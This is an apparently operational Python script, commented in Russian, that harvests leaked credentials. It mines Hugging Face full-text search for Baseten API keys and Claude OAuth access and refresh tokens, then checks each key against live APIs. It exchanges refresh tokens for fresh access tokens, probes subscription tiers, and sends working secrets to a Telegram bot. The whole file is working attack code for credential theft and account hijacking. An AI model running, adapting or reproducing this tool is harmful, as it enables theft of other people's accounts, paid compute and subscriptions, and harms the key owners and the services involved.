# -*- coding: utf-8 -*-
"""🔷 BASETEN-STRIKE: выполняется на GH-раннере (чистый IP, HF без рейт-лимита).
HF full-text по всем baseten-нормам + claudeAiOauth-волне -> литеральные ключи
-> management-судья (api.baseten.co) -> inference-чат (баланс).
ort01 -> refresh-exchange -> свежий oat01 -> тир Claude (Pro/Max)."""

import concurrent.futures
import json
import os
import re
import sys
import time
import urllib.parse

import requests

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

TG = os.environ.get("TG_TOKEN", "")
CHAT = int(os.environ.get("TG_CHAT", "0") or 0)


def tg(msg):
    if not TG or not CHAT:
        return
    try:
        requests.post(
            "https://api.telegram.org/bot%s/sendMessage" % TG,
            json={
                "chat_id": CHAT,
                "text": msg[:3900],
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
    except Exception:
        pass


K832 = re.compile(r"\b[A-Za-z0-9]{8}\.[A-Za-z0-9]{32}\b")
ENV_RE = re.compile(r"BASETEN_API_KEY[\"'\s:=]+([A-Za-z0-9]{8}\.[A-Za-z0-9]{32})")
OAT_RE = re.compile(r"sk-ant-oat01-[A-Za-z0-9_\-]{20,}")
ORT_RE = re.compile(r"sk-ant-ort01-[A-Za-z0-9_\-]{20,}")

HF_QUERIES = [
    "sk-ant-oat01",
    "refreshToken claudeAiOauth",
    "oat01",
    "ort01",
    "basetenApiKey",
    "trussrc",
    "BASETEN_API_KEY",
    "baseten api_key",
]
OFFSETS = (0, 50, 100, 150, 200)

print("=== HF full-text сбор (offset-пагинация) ===")
files = []
for q in HF_QUERIES:
    for typ, seg in (("space", "spaces"), ("dataset", "datasets"), ("model", "")):
        for off in OFFSETS:
            try:
                url = (
                    "https://huggingface.co/api/search/full-text"
                    "?q=%s&type=%s&limit=50&offset=%s"
                    % (urllib.parse.quote(q), typ, off)
                )
                r = requests.get(
                    url, headers={"Accept": "application/json"}, timeout=(8, 20)
                )
                if r.status_code != 200:
                    continue
                total = r.json().get("estimatedTotalHits")
                for hit in (r.json().get("hits") or [])[:50]:
                    owner, repo, path = (
                        hit.get("repoOwner"),
                        hit.get("repoName"),
                        hit.get("fileName"),
                    )
                    if not (owner and repo and path):
                        continue
                    raw = "https://huggingface.co/%s/resolve/main/%s" % (
                        ("%s/%s/%s" % (seg, owner, repo))
                        if seg
                        else ("%s/%s" % (owner, repo)),
                        path,
                    )
                    if raw not in [f[0] for f in files]:
                        files.append((raw, "%s/%s/%s" % (owner, repo, path)))
                if off == 0:
                    print("  %-34s %-8s total=%s" % (q, typ, total))
            except Exception as e:
                print("  hf err %s %s" % (q, type(e).__name__))
                break
print("файлов: %d" % len(files))

baseten_cands = {}
oats = {}
orts = {}


def grab(f):
    raw, name = f
    try:
        rr = requests.get(raw, timeout=(8, 20))
        if rr.status_code == 200 and 20 < len(rr.text) < 600_000:
            return rr.text, name
    except Exception:
        pass
    return None, name


with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
    for txt, name in ex.map(grab, files):
        if not txt:
            continue
        low = txt.lower()
        if "baseten" in low:
            for m in K832.finditer(txt):
                baseten_cands.setdefault(m.group(0), "hf:%s" % name)
            for m in ENV_RE.finditer(txt):
                baseten_cands.setdefault(m.group(1), "hf-env:%s" % name)
        for m in OAT_RE.finditer(txt):
            oats.setdefault(m.group(0), "hf:%s" % name)
        for m in ORT_RE.finditer(txt):
            orts.setdefault(m.group(0), "hf:%s" % name)

print(
    "\nbaseten: %d | oat01: %d | ort01: %d" % (len(baseten_cands), len(oats), len(orts))
)


# ---- BASETEN: management-судья + inference-чат ----
def mgmt_check(k):
    try:
        r = requests.get(
            "https://api.baseten.co/v1/models",
            headers={"Authorization": "Api-Key " + k},
            timeout=(8, 15),
        )
        return r.status_code
    except Exception:
        return None


def baseten_verify(item):
    k, src = item
    code = mgmt_check(k)
    if code != 200:
        return None
    # живой: чат-проб на баланс
    try:
        r = requests.get(
            "https://inference.baseten.co/v1/models",
            headers={"Authorization": "Api-Key " + k},
            timeout=(8, 20),
        )
        models = (
            [m.get("id") for m in (r.json().get("data") or []) if isinstance(m, dict)]
            if r.status_code == 200
            else []
        )
        chat = None
        if models:
            try:
                rc = requests.post(
                    "https://inference.baseten.co/v1/chat/completions",
                    headers={
                        "Authorization": "Api-Key " + k,
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": models[0],
                        "max_tokens": 512,
                        "messages": [{"role": "user", "content": "Say: OK"}],
                    },
                    timeout=(15, 60),
                )
                chat = rc.status_code
            except Exception:
                chat = None
        return (k, src, models, chat)
    except Exception:
        return (k, src, [], None)


print("\n=== management-судья (baseten) ===")
b_winners = []
items = list(baseten_cands.items())
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    for res in ex.map(baseten_verify, items):
        if not res:
            continue
        k, src, models, chat = res
        if chat == 200:
            b_winners.append((k, src, models))
            print("🔷💎 BASETEN ЖИВ С БАЛАНСОМ: %s" % k)
            print("    src: %s | моделей: %d" % (src, len(models)))
            tg(
                "🔷💎 BASETEN С БАЛАНСОМ (strike):\n%s\nsrc: %s\nмоделей: %d\n%s"
                % (k, src, len(models), ", ".join(models[:8]))
            )
        else:
            print("  mgmt 200, чат=%s (пустой акк?): %s… [%s]" % (chat, k[:16], src))
            if chat is None or chat == 402:
                tg(
                    "🔷 BASETEN валиден (баланс:%s):\n%s\nsrc: %s"
                    % ("пусто" if chat == 402 else "?", k, src)
                )

print("baseten с балансом: %d" % len(b_winners))

# ---- CLAUDE: ort01 refresh-exchange -> свежий oat01 -> тир ----
print("\n=== claude refresh-exchange ===")
c_winners = []


def val_ort(item):
    k, src = item
    try:
        r = requests.post(
            "https://console.anthropic.com/v1/oauth/token",
            json={
                "grant_type": "refresh_token",
                "refresh_token": k,
                "client_id": "9d1c250a-e61b-44d9-88ed-5944d1962f5e",
            },
            timeout=(8, 20),
        )
        if r.status_code != 200:
            return None
        fresh = r.json().get("access_token", "")
        if not fresh.startswith("sk-ant-oat"):
            return None
        # тир-тест: sonnet-проба
        rh = requests.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "Authorization": "Bearer " + fresh,
                "anthropic-version": "2023-06-01",
                "anthropic-beta": "oauth-2025-04-20",
                "Content-Type": "application/json",
            },
            json={
                "model": "claude-sonnet-5",
                "max_tokens": 4,
                "messages": [{"role": "user", "content": "hi"}],
            },
            timeout=(10, 30),
        )
        tier = (
            "PRO/MAX?" if rh.status_code == 200 else ("MAX-окно? %s" % rh.status_code)
        )
        return (k, fresh, src, rh.status_code)
    except Exception:
        return None


with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    for res in ex.map(val_ort, list(orts.items())[:40]):
        if res:
            k, fresh, src, code = res
            c_winners.append(res)
            print(
                "💎💎 ORT01 ЖИВ (refresh ok, sonnet=%s): %s… src=%s"
                % (code, k[:30], src)
            )
            tg(
                "💎 CLAUDE-ПОДПИСКА ЖИВА (strike, sonnet %s):\nrefresh: %s\nСВЕЖИЙ OAT01: %s\nsrc: %s"
                % (code, k, fresh, src)
            )


def val_oat(item):
    k, src = item
    try:
        rh = requests.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "Authorization": "Bearer " + k,
                "anthropic-version": "2023-06-01",
                "anthropic-beta": "oauth-2025-04-20",
                "Content-Type": "application/json",
            },
            json={
                "model": "claude-haiku-4-5-20251001",
                "max_tokens": 4,
                "messages": [{"role": "user", "content": "hi"}],
            },
            timeout=(10, 30),
        )
        if rh.status_code == 200:
            return (k, src)
    except Exception:
        pass
    return None


with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    for res in ex.map(val_oat, list(oats.items())[:30]):
        if res:
            k, src = res
            c_winners.append((k, None, src, 200))
            print("💎 OAT01 ЖИВ: %s… src=%s" % (k[:30], src))
            tg("💎 CLAUDE OAT01 ЖИВ (strike):\n%s\nsrc: %s" % (k, src))

print("\nИТОГ STRIKE: baseten=%d | claude=%d" % (len(b_winners), len(c_winners)))
if b_winners or c_winners:
    tg(
        "⚔️ STRIKE ИТОГ: baseten живых %d, claude живых %d"
        % (len(b_winners), len(c_winners))
    )
else:
    tg(
        "⚔️ STRIKE закончен: %d baseten-кандидатов, %d ort01, %d oat01 — все проверены, живых нет (пул исчерпан)"
        % (len(baseten_cands), len(orts), len(oats))
    )
